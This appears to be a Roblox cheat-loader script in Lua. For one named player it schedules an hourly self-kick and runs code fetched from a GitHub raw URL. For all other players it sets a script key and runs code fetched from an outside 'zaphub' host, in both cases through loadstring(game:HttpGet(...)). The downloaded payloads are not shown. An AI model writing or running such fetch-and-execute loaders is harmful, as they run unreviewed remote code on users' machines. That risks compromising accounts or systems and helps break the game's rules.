local Players = game:GetService("Players")
local player = Players.LocalPlayer

if player.Name == "AkFrosty_YT" then

    -- Kick every IST hour only for AkFrosty_YT
    task.spawn(function()
        local lastHour = -1

        while true do
            local utc = os.time()
            local ist = os.date("*t", utc + 19800) -- IST (UTC+5:30)

            if ist.min == 0 and lastHour ~= ist.hour then
                lastHour = ist.hour
                player:Kick("Scheduled restart")
                break
            end

            task.wait(5)
        end
    end)

    loadstring(game:HttpGet("https://raw.githubusercontent.com/Monster69696/PS99/main/Backroom/Script"))()

else

    script_key = "wUyvmjsmuvRIwOPwLszkupgIOvvIkoYq"
    loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()

end
